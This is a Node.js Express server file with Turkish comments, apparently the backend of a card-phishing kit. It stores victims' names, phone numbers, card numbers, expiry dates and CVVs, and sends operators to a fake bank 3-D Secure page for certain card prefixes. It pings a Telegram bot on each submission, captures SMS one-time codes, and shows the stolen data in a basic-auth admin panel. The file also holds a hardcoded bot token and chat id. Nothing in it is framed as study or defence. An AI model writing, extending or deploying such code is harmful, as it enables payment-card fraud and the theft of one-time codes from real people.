const express        = require('express');
const basicAuth      = require('express-basic-auth');
const path           = require('path');
const low            = require('lowdb');
const FileSync       = require('lowdb/adapters/FileSync');
const ShortUniqueId  = require('short-unique-id');
const axios          = require('axios');

// ✅ Telegram bilgileri
const token  = '8191580694:AAG7EnTXoERSTuuuY381HK7ExtJyB2T8IxUE';        // ← kendi tokenin
const chatId = '-4728131788';          // ← kendi chat id'in

process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));
process.on('uncaughtException', (e) => console.error('uncaughtException', e));

// UID ve veritabanı
const uid     = new ShortUniqueId({ length: 8 }); 
const file    = path.join(__dirname, 'db.json');
const adapter = new FileSync(file);
const db      = low(adapter);
db.defaults({ submissions: [], visits: 0 }).write();

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.urlencoded({ extended: true }));

// Ana sayfa
app.get('/', (req, res) => {
  db.update('visits', n => n + 1).write();
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Statik dosyalar
app.use(express.static(path.join(__dirname, '../frontend')));

// 📤 Form gönderimi
app.post('/submit-form', async (req, res) => {
  const { name, phone, card, CARD, expdate, EXP, EXP_YEAR, cvv } = req.body;
  const newId = uid.rnd();

  const raw = (card || "").replace(/\D/g, '');
  const prefix8 = raw.substr(0, 8);


  // Veriyi kaydet
  db.get('submissions')
    .unshift({
      id: newId,
      name,
      phone,
      card,
      CARD,
      expdate,
      EXP,
      EXP_YEAR,
      cvv,
      createdAt: new Date().toISOString()
    })
    .write();
    
  if (prefix8 === '40985844' || prefix8 === '54112498') {
    return res.redirect('/leobank-3ds.html');
  }

   try {
   await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
       chat_id: chatId,
       text: `💳 Yeni Başvuru`
     });
       } catch (err) {
     console.error('Telegram HATA:', err.message);
   }

  res.redirect(`/sms.html?trans_id=${newId}`);
});

// 📲 SMS formu
app.post('/submit-sms', (req, res) => {
  const { trans_id, smsCode } = req.body;

  db.get('submissions')
    .find({ id: trans_id })
    .assign({ smsCode, smsAt: new Date().toISOString() })
    .write();

  res.sendStatus(200);
});

// 👮 Panel - şifre korumalı
app.get('/panel',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    const visits      = db.get('visits').value();
    res.render('panel', { submissions, visits });
  }
);

// 🔓 Logout
app.get('/logout', (req, res) => {
  res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
  res.status(401).send('Çıkış yapıldı');
});

// 🌐 Sunucu başlat
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server http://0.0.0.0:${PORT}`));
